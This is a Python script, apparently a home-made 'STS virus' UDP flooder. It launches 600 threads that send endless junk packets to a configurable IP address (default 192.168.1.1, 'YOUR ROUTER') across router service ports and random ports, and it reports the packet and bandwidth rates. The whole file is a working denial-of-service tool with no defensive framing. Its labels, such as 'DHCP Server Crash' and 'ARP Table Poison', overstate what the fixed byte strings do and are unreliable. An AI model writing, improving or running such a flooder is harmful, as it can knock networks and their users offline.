import socket
import threading
import time
import random
import struct

TARGET_IP = "192.168.1.1"  # YOUR ROUTER

# ==================== STS VIRUS HEADERS ====================
PPS_VIRUSES = [
    # STS Strike Team Sierra Rapid PPS
    b'STS-RAPID\x00' + random.randbytes(56),
    
    # STARSHIP PPS Virus
    b'STARSHIP-PPS\x00' + b'\xDE\xAD' * 26,
    
    # ZAP-DEAD PPS Header
    b'ZAP-DEAD***.★★.★\x00' + b'\xFF\x00' * 22,
    
    # 💥STS💥 PPS Marker
    b'\xE2\x9A\xA0STS\xE2\x9A\xA0' + b'\xCC' * 56,
    
    # Sierra Team Signature
    b'SIERRA-TEAM\x00' + b'\xAA\x55' * 26,
]

BW_VIRUSES = [
    # STS Bandwidth Nuke (1024 bytes)
    b'STS-BW-NUKE\x00' + b'\x00' * 512 + b'\xFF' * 500,
    
    # STARSHIP Bandwidth Destroyer
    b'STARSHIP-BW\x00' + b'\xDE\xAD\xBE\xEF' * 250,
    
    # ZAP-DEAD Bandwidth Killer  
    b'ZAP-DEAD-BW***\x00' + b'\xCA\xFE\xBA\xBE' * 250,
    
    # 💥STS💥 Maximum Bandwidth
    b'\xE2\x9A\xA0STS-BW\xE2\x9A\xA0' + random.randbytes(1000),
    
    # Sierra Team Bandwidth Bomb
    b'SIERRA-BANDWIDTH\x00' + bytes([i % 256 for i in range(1000)]),
]

ROUTER_KILL_VIRUSES = [
    # DHCP Server Crash
    b'STS-DHCP\x00\x01\x01\x06\x00' + b'\xFF' * 300,
    
    # ARP Table Poison
    b'STARSHIP-ARP\x00\xff\xff\xff\xff\xff\xff' + b'\x00' * 100,
    
    # NAT Table Overflow
    b'ZAP-NAT\x00' + bytes([random.randint(1, 254) for _ in range(500)]),
    
    # WiFi Driver Crash
    b'💥WIFI\x00\x08\x00' + b'\xAA' * 500,
    
    # Router Admin Panel Crash
    b'SIERRA-ADMIN\x00GET /admin/' + b'../' * 100,
]

# ==================== VIRUS GENERATORS ====================
def gen_pps_virus():
    virus = random.choice(PPS_VIRUSES)
    # Add corrupt body
    body = bytes([random.randint(0, 255) for _ in range(64 - len(virus))])
    return virus + body

def gen_bw_virus():
    virus = random.choice(BW_VIRUSES)
    # Large corrupt body
    body = bytes([random.choice([0x00, 0xFF, 0x80, 0x7F]) for _ in range(1024 - len(virus))])
    return virus + body

def gen_kill_virus():
    virus = random.choice(ROUTER_KILL_VIRUSES)
    # Maximum corruption
    body = b'\xCC' * (1472 - len(virus))
    return virus + body

# ==================== THREAD CONFIG ====================
UDP_RAPID_PPS = 150    # Fast small virus packets
UDP_PPS = 150          # Regular PPS virus packets
UDP_RAPID_BW = 150     # Fast large virus packets  
UDP_BW = 150           # Regular bandwidth virus packets
TOTAL_THREADS = 600

# Global counters
total_packets = 0
total_bytes = 0

# ==================== UDP RAPID PPS VIRUS ====================
def udp_rapid_pps_virus(thread_id):
    global total_packets, total_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Critical router ports
    ROUTER_PORTS = [53, 80, 443, 23, 21, 22, 25, 67, 68, 161, 162, 123, 1900, 7547]
    
    while True:
        try:
            # MAXIMUM SPEED - STS VIRUS PACKETS
            for _ in range(30):  # 30 virus packets per loop
                virus = gen_pps_virus()
                
                # RAPID FIRE to all router ports
                for port in ROUTER_PORTS:
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += len(virus)
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== UDP PPS VIRUS ====================
def udp_pps_virus(thread_id):
    global total_packets, total_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # Regular PPS - STS virus packets
            for _ in range(20):
                virus = gen_pps_virus()
                
                # Attack range of ports with virus
                for _ in range(10):
                    port = random.randint(1, 65535)
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += len(virus)
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== UDP RAPID BANDWIDTH VIRUS ====================
def udp_rapid_bw_virus(thread_id):
    global total_packets, total_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Router bandwidth ports
    BW_PORTS = [80, 443, 8080, 8443, 7547]
    
    while True:
        try:
            # Fast bandwidth - Large STS viruses
            for _ in range(12):
                virus = gen_bw_virus()
                
                # Hammer bandwidth ports with viruses
                for port in BW_PORTS:
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += len(virus)
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== UDP BANDWIDTH VIRUS ====================
def udp_bandwidth_virus(thread_id):
    global total_packets, total_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # Maximum bandwidth - Router kill viruses
            for _ in range(8):
                virus = gen_kill_virus()
                
                # Saturate all ports with kill viruses
                for _ in range(8):
                    port = random.randint(1, 65535)
                    sock.sendto(virus, (TARGET_IP, port))
                    total_packets += 1
                    total_bytes += len(virus)
                    
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# ==================== LAUNCH ALL 600 VIRUS THREADS ====================
# Start UDP Rapid PPS Virus
for i in range(UDP_RAPID_PPS):
    t = threading.Thread(target=udp_rapid_pps_virus, args=(i,))
    t.daemon = True
    t.start()

# Start UDP PPS Virus
for i in range(UDP_PPS):
    t = threading.Thread(target=udp_pps_virus, args=(i,))
    t.daemon = True
    t.start()

# Start UDP Rapid Bandwidth Virus
for i in range(UDP_RAPID_BW):
    t = threading.Thread(target=udp_rapid_bw_virus, args=(i,))
    t.daemon = True
    t.start()

# Start UDP Bandwidth Virus
for i in range(UDP_BW):
    t = threading.Thread(target=udp_bandwidth_virus, args=(i,))
    t.daemon = True
    t.start()

# ==================== LOGGING ONLY ====================
last_log = time.time()

while True:
    time.sleep(1)
    current = time.time()
    elapsed = current - last_log
    last_log = current
    
    # Calculate
    pps = int(total_packets / elapsed) if elapsed > 0 else 0
    mbps = (total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
    
    # Reset
    total_packets = 0
    total_bytes = 0
    
    # SK1-SSALG LOGGING ONLY - STS VIRUS EDITION
    print(f"SK1-SSALG | {pps:,}/s | {mbps:.1f}Mbps")
